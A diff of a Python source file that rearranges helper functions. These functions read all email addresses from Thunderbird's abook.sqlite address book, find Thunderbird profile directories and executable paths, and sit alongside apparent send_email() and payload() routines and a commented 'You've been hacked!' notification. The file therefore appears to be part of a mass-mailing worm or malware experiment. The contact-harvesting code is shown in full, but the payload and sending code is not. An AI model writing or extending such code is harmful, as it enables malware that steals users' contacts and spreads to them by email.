@@ -338,33 +338,8 @@ def traverse_dirs(curr_dir: str) -> None:
 
 
 # --------------------------------------------------------------------------
-# ----------------- 1st class send email helper functions ------------------
+# ----------------- 2nd class send email helper functions ------------------
 # --------------------------------------------------------------------------
-
-    
-def read_email_addresses_thunderbird() -> typing.List[str]:
-    """
-    :returns: a list of all email addresses contained in Thunderbird's 
-              `abook.sqlite` database if this database exists, `None` otherwise.
-    """
-    # TODO: Search for `abook.sqlite` on the file system
-    database = "/home/telekobold/TestVerzeichnis/TestVerzeichnis/PythonTest/abook.sqlite"
-    con = None
-    email_addresses = []
-    
-    if os.path.isfile(database):
-        with sqlite3.connect(database) as con:
-            with con:
-                cur = con.cursor()
-                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
-                rows = cur.fetchall()
-                for row in rows:
-                    (email_addr,) = row # unpack the tuple returned by fetchall()
-                    email_addresses.append(email_addr)
-            return email_addresses
-    else:
-        return None
-
 
 def determine_thunderbird_default_file_path() -> str:
     """
@@ -430,6 +405,46 @@ def add_profile_dir_to_list(thunderbird_path: str, line: str, profile_dir_names:
         profile_dir_names.append(profile_dir_name_absolute)
         
     return profile_dir_names
+
+
+# --------------------------------------------------------------------------
+# ----------------- 1st class send email helper functions ------------------
+# --------------------------------------------------------------------------
+
+def determine_possible_paths() -> str:
+    """
+    Determines possible paths where an executable of Mozilla Thunderbird
+    could be located and returns them as possibly extended PATH variable
+    in the appropriate syntax, depending on which operating system is installed.
+    
+    :returns: A possibly extended version of the local PATH variable
+              or `None` if no PATH variable could be found or if the detected OS
+              is neither "Windows", nor "Linux".
+    """
+    try:
+        paths: str = os.environ["PATH"]
+    except KeyError:
+        return None
+    additional_paths_windows: typing.List[str] = [os.path.join("C:\Program Files", "Mozilla Thunderbird")]
+    additional_paths_linux: typing.List[str] = []
+    additional_paths: typing.List[str] = []
+    splitter: str = ""
+    
+    if INSTALLED_OS == WINDOWS:
+        splitter = ";"
+        additional_paths = additional_paths_windows
+    elif INSTALLED_OS == LINUX:
+        splitter = ":"
+        additional_paths = additional_paths_linux
+    else:
+        # Not supported OS
+        return None
+    read_paths_list = paths.split(splitter)
+    for path in additional_paths:
+        if path not in read_paths_list:
+            paths = paths + splitter + path
+    
+    return paths
 
 
 def find_thunderbird_default_profile_dir() -> typing.List[str]:
@@ -500,41 +515,29 @@ def find_thunderbird_default_profile_dir() -> typing.List[str]:
     print(f"profile_dir_names = {profile_dir_names}")
     return profile_dir_names
 
-
-def determine_possible_paths() -> str:
-    """
-    Determines possible paths where an executable of Mozilla Thunderbird
-    could be located and returns them as possibly extended PATH variable
-    in the appropriate syntax, depending on which operating system is installed.
     
-    :returns: A possibly extended version of the local PATH variable
-              or `None` if no PATH variable could be found or if the detected OS
-              is neither "Windows", nor "Linux".
+def read_email_addresses_thunderbird() -> typing.List[str]:
     """
-    try:
-        paths: str = os.environ["PATH"]
-    except KeyError:
-        return None
-    additional_paths_windows: typing.List[str] = [os.path.join("C:\Program Files", "Mozilla Thunderbird")]
-    additional_paths_linux: typing.List[str] = []
-    additional_paths: typing.List[str] = []
-    splitter: str = ""
+    :returns: a list of all email addresses contained in Thunderbird's 
+              `abook.sqlite` database if this database exists, `None` otherwise.
+    """
+    # TODO: Search for `abook.sqlite` on the file system
+    database = "/home/telekobold/TestVerzeichnis/TestVerzeichnis/PythonTest/abook.sqlite"
+    con = None
+    email_addresses = []
     
-    if INSTALLED_OS == WINDOWS:
-        splitter = ";"
-        additional_paths = additional_paths_windows
-    elif INSTALLED_OS == LINUX:
-        splitter = ":"
-        additional_paths = additional_paths_linux
+    if os.path.isfile(database):
+        with sqlite3.connect(database) as con:
+            with con:
+                cur = con.cursor()
+                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
+                rows = cur.fetchall()
+                for row in rows:
+                    (email_addr,) = row # unpack the tuple returned by fetchall()
+                    email_addresses.append(email_addr)
+            return email_addresses
     else:
-        # Not supported OS
         return None
-    read_paths_list = paths.split(splitter)
-    for path in additional_paths:
-        if path not in read_paths_list:
-            paths = paths + splitter + path
-    
-    return paths
 
 
 # --------------------------------------------------------------------------
@@ -582,7 +585,6 @@ def send_email() -> None:
 
 if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
-    
     #payload()
     #send_email()
     #notification("You've been hacked!", message="", app_name="filewriter")
